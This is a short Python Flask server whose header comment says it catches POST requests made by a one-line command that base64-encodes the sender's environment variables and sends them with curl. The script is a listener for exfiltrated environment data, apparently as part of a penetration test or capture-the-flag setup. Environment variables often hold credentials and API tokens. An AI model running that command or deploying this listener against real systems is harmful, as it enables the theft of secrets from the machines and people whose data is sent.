#!/usr/bin/env python3

#####
# 
# This file will catch a post request that is sent using something similar to
# $ STUFF=`env | base64`; curl -H "Content-Type: application/json" -d '{"Env_Data":"$STUFF"}' -X POST 
#
#####

from flask import Flask
from flask import request
import base64
app = Flask(__name__)
@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'POST':
        print("Inside POST")
        data_json = request.get_json()
        print(data_json)
        return data_json

    if request.method == 'GET':
        print(request.args)
        return("<h1>Hi!</h1>")

if __name__ == '__main__':
    app.run()

